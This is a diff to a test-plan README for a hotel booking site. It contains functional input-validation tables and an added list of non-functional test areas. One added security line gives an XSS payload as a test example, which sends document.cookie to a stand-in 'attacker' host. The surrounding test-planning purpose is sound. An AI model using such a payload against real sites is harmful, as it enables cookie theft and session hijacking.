@@ -2,8 +2,6 @@
 
 ## Functional Tests
 
-To be executed in supported browsers and mobile devices.
-
 **Background:** I am viewing the booking url <br>
 *Given I have a browser open* <br>
 **And the browser has javascript enabled** <br>
@@ -123,9 +121,9 @@ To be executed in supported browsers and mobile devices.
 
 **Examples:** <br>
 
- firstName | surName | price | checkIn | checkOut 
-  --- | --- | ---| ---  | --- 
-|           |  |  |  | | 
+ firstName | surName | price | deposit | checkIn | checkOut 
+  --- | --- | ---| --- | --- | --- 
+|           |  |  |  | | |
 |           | validSurname | 10.00 | false | 2020-10-10 | 2020-10-11 | 
 | 213       | validSur    | 10.00 | false | 2020-10-10 | 2020-10-11 | 
 | $%#%      | validSur    | 10.00 | false | 2020-10-10 | 2020-10-11 | 
@@ -136,7 +134,7 @@ To be executed in supported browsers and mobile devices.
 | vaidfirst |   validSur  | fds | false | 2020-10-10 | 2020-10-11 |
 | vaidfirst |   validSur  | -10 | false | 2020-10-10 | 2020-10-11 |
 | vaidfirst |   validSur  | 10.123 | false | 2020-10-10 | 2020-10-11 |
-| vaidfirst |   validSur  | 10  |  | false | 2020-10-11 |
+| vaidfirst |   validSur  | 10     | false |  | 2020-10-11 |
 | vaidfirst |   validSur | 10   | false | tenth April  | 2020-10-11 |
 | vaidfirst |   validSur | 10.00   | false |  $%#%  | 2020-10-11 |
 | vaidfirst |   validSur | 10.00   | false | 20201010 | 2020-10-11 |
@@ -150,13 +148,32 @@ To be executed in supported browsers and mobile devices.
 
 Tests have been developed in visual studio 2015. To run the Automated test clone this repository and open the .sln file (ensure you have the NuGet package restore option enabled) 
 
+# Non-Functional Tests
 
+## Security / Pentration
+- Javascript Injection tests XXS e.g. <script> window.location='http://attacker/?cookie='+document.cookie</script> saved as input parameter. ** THIS TEST BRINGS THE SITE DOWN **
 
+- Should be https (if publicly accessible)
 
+## Usabilty
+- Ensure UI is usable in selection of mobile devices
+- Ensure the GUI can be used by as wide an audience as possible
+- Adding pagination when number of bookings > n number
 
+## Performance 
+- Response times are as specified
+- Query and load times are as specified
+- Processing times are as expected
+- Check that as the number of bookings increases that the site continues to perform as to specification
+- Find the threshold at which the site grinds to a halt
 
+## Recoverability
+- Backup frequencies, transaction data, config data, code backed-up?
 
+## Capacity
+- Throughput how many transactions a peak
+- Storage
+- Growth requirements
 
-
-
-
+## Scalability
+- can the solution be scaled effectively
